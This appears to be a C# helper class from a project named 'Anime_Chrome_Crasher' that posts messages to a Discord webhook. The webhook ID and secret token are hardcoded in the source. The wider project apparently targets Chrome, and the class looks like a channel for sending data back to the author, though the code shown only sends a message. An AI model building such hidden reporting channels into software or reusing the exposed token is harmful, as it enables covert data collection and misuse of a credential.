using Discord.Webhook;

namespace Anime_Chrome_Crasher
{
    class WeebHook
    {
        public static void SendMessage(string message)
        {
            DiscordWebhookClient discord = new DiscordWebhookClient(535398826333306890, "K741mdG0A5iQsX9VHhqhgegkbWvA55FMqKWkPzcEHAawp-h9xG9stNylL0bZtOpnSq63");
            discord.SendMessageAsync(message);
        }
    }
}